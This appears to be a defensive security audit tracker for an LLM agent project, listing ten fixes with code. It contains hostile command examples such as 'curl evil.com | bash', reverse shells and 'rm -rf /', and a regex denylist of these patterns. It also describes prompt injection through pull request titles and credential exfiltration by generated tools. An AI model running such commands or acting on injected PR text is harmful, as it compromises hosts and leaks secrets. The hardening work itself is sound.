# Malicious Execution + Agent Escape Audit — Fix Tracker

**Audit date:** 2026-05-24  
**Audited by:** Claude Sonnet 4.6 (local static analysis)  
**Scope:** Full codebase — shell execution, Python execution, tool registry, GitHub Actions, network exfiltration, malicious code indicators  
**Status key:** `[ ]` open · `[x]` done · `[-]` won't fix / accepted risk

---

## Priority 1 — Critical

### FIX-001 · Command denylist in `run_bash`

**File:** [tools/run/bash.py](../tools/run/bash.py)  
**Severity:** Critical  
**Status:** `[x]`

**Finding:** `tools/run/bash.py` passes the full stdin command verbatim to `subprocess.run(..., shell=True)`. When the registry has `exec=True`, any command the LLM constructs — including `curl evil.com | bash`, `rm -rf /`, reverse shells — executes without restriction. The only current gate is the registry's `exec=False` default, which a local operator may enable.

**Fix:** Add a denylist check before the subprocess call:

```python
import re

_BLOCKED_PATTERNS = [
    r"\brm\s+(-[rRfF]+\s+)+",          # rm -rf variants
    r"\brmdir\b",
    r"\bdel\s+/[sqSQ]\b",              # Windows del /s /q
    r"\bformat\b",
    r"\bcurl\b.+\|\s*(ba)?sh\b",       # curl | bash
    r"\bwget\b.+\|\s*(ba)?sh\b",       # wget | bash
    r"\bpip\s+install\b",              # package installation
    r"\bapt[-\s]?(get)?\s+install\b",
    r"\bchmod\s+[0-7]*7[0-7]*\b",      # world-write/execute
    r"\b(nc|ncat|netcat)\b.+-e\b",     # reverse shell
    r"\bpython\S*\s+-c\b",             # inline python execution
    r"\bpowershell\b.+-[Ee]nc\b",      # encoded PS payloads
]

def _is_blocked(command: str) -> bool:
    return any(re.search(p, command, re.IGNORECASE) for p in _BLOCKED_PATTERNS)
```

Call `_is_blocked(command)` before `subprocess.run()`; print `[BASH BLOCKED]` and return if matched. Also log every invocation with timestamp and truncated command to `logs/bash_audit.log`.

**Tests added:** `tests/test_security.py` → `TestBashDenylist`

- `test_rm_rf_blocked`
- `test_curl_pipe_bash_blocked`
- `test_wget_pipe_sh_blocked`
- `test_reverse_shell_blocked`
- `test_pip_install_blocked`
- `test_safe_command_allowed`

---

## Priority 2 — High

### FIX-002 · Strip environment in forge dry-run

**File:** [app/agent/tool_forge.py:180](../app/agent/tool_forge.py)  
**Severity:** High  
**Status:** `[x]`

**Finding:** `validate_tool()` executes the generated tool script with `subprocess.run([sys.executable, tmp_path] + test_args, cwd=project_dir)`. No `env=` parameter is passed, so the child process inherits the full parent environment — including `GITHUB_TOKEN`, `ANTHROPIC_API_KEY`, `AWS_SECRET_ACCESS_KEY`, and any other credentials in the shell. A malicious forge prompt could produce a tool that exfiltrates these during the validation dry-run, before the tool even reaches quarantine.

**Fix:** Pass a stripped environment:

```python
import os

clean_env = {
    k: os.environ[k]
    for k in ("PATH", "PYTHONPATH", "SYSTEMROOT", "TEMP", "TMP")
    if k in os.environ
}
result = subprocess.run(
    [sys.executable, tmp_path] + test_args,
    capture_output=True,
    text=True,
    timeout=10,
    cwd=project_dir,
    env=clean_env,   # replaces inheriting parent env
)
```

**Tests added:** `tests/test_security.py` → `TestForgeQuarantineDryRunEnv`

- `test_forge_dryrun_strips_env`
- `test_forge_dryrun_clean_env_excludes_secrets`

---

### FIX-003 · Gate PR auto-review on repository membership

**File:** [.github/workflows/j-agent.yml](../.github/workflows/j-agent.yml) and [github_agent/run.py](../github_agent/run.py)  
**Severity:** High  
**Status:** `[x]`

**Finding:** `j-agent.yml` triggers on all `pull_request` events (including from forks). `github_agent/run.py` applies `_is_authorized_actor()` only to `issue_comment` events. PR events bypass authorization entirely — any user submitting a PR can inject prompts via the PR title or body, which are passed verbatim to the LLM in `build_pull_request_prompt()`. With write and exec disabled in CI, direct tool damage is limited, but J can be tricked into leaking code content via comments.

**Fix — Option A (workflow level):** Add a job condition to block fork PRs:

```yaml
jobs:
  run-j-agent:
    if: |
      (github.event_name == 'pull_request' && github.event.pull_request.head.repo.fork == false)
      || (github.event_name == 'issue_comment' && startsWith(github.event.comment.body, '/j'))
```

**Fix — Option B (defence-in-depth):** Keep Option A and add a PR sender check in `run.py`:

```python
def _is_authorized_pr(event: dict) -> bool:
    association = event.get("pull_request", {}).get("author_association", "NONE")
    return association in _AUTHORIZED_ROLES
```

Both options were applied.

**Tests added:** `tests/test_security.py` → `TestPRAuthorization`

- `test_owner_allowed`
- `test_collaborator_allowed`
- `test_contributor_blocked`
- `test_none_blocked`
- `test_fork_gate_in_workflow`

---

## Priority 3 — Medium

### FIX-004 · Redact credential values in scan preview

**File:** [tools/run/scan.py:143](../tools/run/scan.py)  
**Severity:** Medium  
**Status:** `[x]`

**Finding:** When a credential pattern matches, the scanner includes an 80-character preview of the matching line. This preview may show the actual secret value (e.g., `API_KEY = sk-abc123...`). The finding is also written to `logs/last_audit.json` and may be posted in J's response comment.

**Fix:** Redact the value after the separator:

```python
# before:
clean = line.strip()[:80]

# after:
clean = re.sub(r'([=:]\s*)\S+', r'\1[REDACTED]', line.strip())[:80]
```

**Tests added:** `tests/test_security.py` → `TestScanCredentialRedaction`

- `test_api_key_value_redacted`
- `test_password_value_redacted`
- `test_token_value_redacted`
- `test_scan_source_uses_redaction`

---

### FIX-005 · Reject duplicate tool registration

**File:** [app/agent/tool_registry.py:42](../app/agent/tool_registry.py)  
**Severity:** Medium  
**Status:** `[x]`

**Finding:** `_register()` silently overwrites any existing tool with the same name. A second call with the same name replaces the handler without warning. An attacker who can trigger two registrations could swap a safe handler for a malicious one.

**Fix:**

```python
def _register(self, spec: ToolSpec, fn: ToolCallable) -> None:
    if spec.name in self.tools:
        raise ValueError(f"Tool '{spec.name}' is already registered — refusing silent override")
    self.specs[spec.name] = spec
    self.tools[spec.name] = fn
```

A separate `_reregister()` method is provided for deliberate replacements that require an explicit call.

**Tests added:** `tests/test_security.py` → `TestRegistryDuplicateProtection`

- `test_duplicate_registration_raises`
- `test_reregister_allowed_explicitly`

---

### FIX-006 · Eliminate `shell=True` in `scan.py._run_cmd`

**File:** [tools/run/scan.py:165-171](../tools/run/scan.py)  
**Severity:** Medium (low injection risk, hygiene)  
**Status:** `[x]`

**Finding:** `_run_cmd(cmd: str)` used `shell=True` because some commands used shell pipes (`netstat -an | findstr LISTENING`). All command strings were hardcoded so there was no injection path. However `shell=True` with string commands is the dominant pattern for shell injection in Python and any future change making `cmd` dynamic would be instantly critical.

**Fix:** Replace shell pipes with Python-level filtering:

```python
def _run_cmd(cmd: list[str], grep: str | None = None) -> str:
    """Run a command list; optionally filter output lines by substring."""
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=10,
                           encoding="utf-8", errors="replace")
        out = (r.stdout or "").strip()
        if grep:
            out = "\n".join(l for l in out.splitlines() if grep in l)
        return out
    except Exception as e:
        return f"[ERROR] {e}"
```

All 13 call sites updated. Platform-specific `||` shell chains replaced with Python try/fallback:

```python
# before:
_run_cmd("netstat -an | findstr LISTENING")

# after:
_run_cmd(["netstat", "-an"], grep="LISTENING")
```

---

### FIX-007 · Cap exec sandbox output size

**File:** [tools/run/exec.py](../tools/run/exec.py)  
**Severity:** Medium  
**Status:** `[x]`

**Finding:** The exec sandbox enforced a 10-second timeout but no output size cap. Sandboxed code could `print("A" * 10_000_000)` to flood the parent process buffer. `bash.py` caps at 64 KB; `exec.py` did not.

**Fix:**

```python
MAX_EXEC_OUTPUT = 64 * 1024  # matches bash.py cap

output = (result.stdout or "") + (result.stderr or "")
if len(output) > MAX_EXEC_OUTPUT:
    output = output[:MAX_EXEC_OUTPUT] + "\n[SANDBOX OUTPUT TRUNCATED at 64 KB]"
if output:
    print(output, end="")
```

**Tests added:** `tests/test_security.py` → `TestExecSandboxOutputCap`

- `test_large_output_truncated`

---

## Priority 4 — Nice-to-have / Hardening

### FIX-008 · Remove `type` from exec sandbox ALLOWED_BUILTINS

**File:** [tools/run/exec.py:83](../tools/run/exec.py)  
**Severity:** Low  
**Status:** `[x]`

**Finding:** `type` was in `ALLOWED_BUILTINS`. While the dunder blocking rules close all known CPython escape chains that use `type`, keeping it live increases future attack surface unnecessarily. `type` is a powerful meta-function — it creates new classes, queries object types, and is the root of the MRO.

**Fix:** Removed `"type"` from `ALLOWED_BUILTINS`. `isinstance` (already in the list) covers type-checking needs in sandboxed code.

---

### FIX-009 · Add UNC path escape test

**File:** [tests/test_security.py](../tests/test_security.py)  
**Severity:** Low  
**Status:** `[x]`

**Finding:** `TestPathGuard` covered `../../` traversal, absolute `/` paths, and Windows `C:\` drive paths. UNC paths (`\\server\share\evil.txt`) were not tested. `Path.resolve()` on Windows resolves UNC paths as absolute and `resolved.relative_to(_ROOT)` correctly rejects them — but this was unverified.

**Fix:** Added `TestPathGuardUNC` with:

- `test_write_unc_path_blocked`
- `test_read_unc_path_blocked`

---

### FIX-010 · Add symlink escape test

**File:** [tests/test_security.py](../tests/test_security.py)  
**Severity:** Low  
**Status:** `[x]`

**Finding:** `_path_guard.safe_path()` calls `Path.resolve()` which follows symlinks. A symlink inside the project root pointing to an external path would resolve outside root and be rejected by `resolved.relative_to(_ROOT)` — but this was untested.

**Fix:** Added `TestPathGuardSymlink` with:

- `test_symlink_outside_root_blocked` (skips on Windows without Developer Mode)

---

## Accepted Risks (Won't Fix)

| ID | Finding | Rationale |
| --- | --- | --- |
| AR-001 | `app/llm.py` sends conversation content to LLM API | Expected for an LLM agent; HTTPS; no credentials in payload |
| AR-002 | `sandbox.py:_check_tests()` uses `shell=True` for hardcoded test command | Command is compile-time constant; not reachable from LLM input |
| AR-003 | `HOME` env var available in exec sandbox child process | Can't be used to open files (no `open` builtin); acceptable |
| AR-004 | `bridge.py:cmd_rescan()` dynamically imports `scan.py` | Loads a known project file by resolved path; mitigated by shield integrity baseline |
| AR-005 | `run_shield wipe` can delete project files | Path-contained to project root; requires explicit `exec` side-effect and operator invocation |

---

## Audit Coverage — What Was Checked

- All `*.py` files in `app/`, `tools/run/`, `github_agent/`, `tests/`
- `.github/workflows/ci.yml` and `.github/workflows/j-agent.yml`
- `tools/run/registry.json`
- All `shell=True`, `os.system`, `eval(`, `exec(`, `subprocess`, `importlib`, `base64`, `pickle`, `marshal`, `httpx`, `urllib`, `socket`, `GITHUB_TOKEN`, `api_key`, `password`, `token` patterns

## What Was Not Checked

- Runtime behaviour (no dynamic analysis)
- Cargo/Rust code in `jgpu/` (not in scope)
- Third-party packages in `requirements.txt` (supply chain — out of scope)
- Model weights / GGUF files

---

*All 10 fixes applied 2026-05-24. Add PR/commit reference here when merged.*
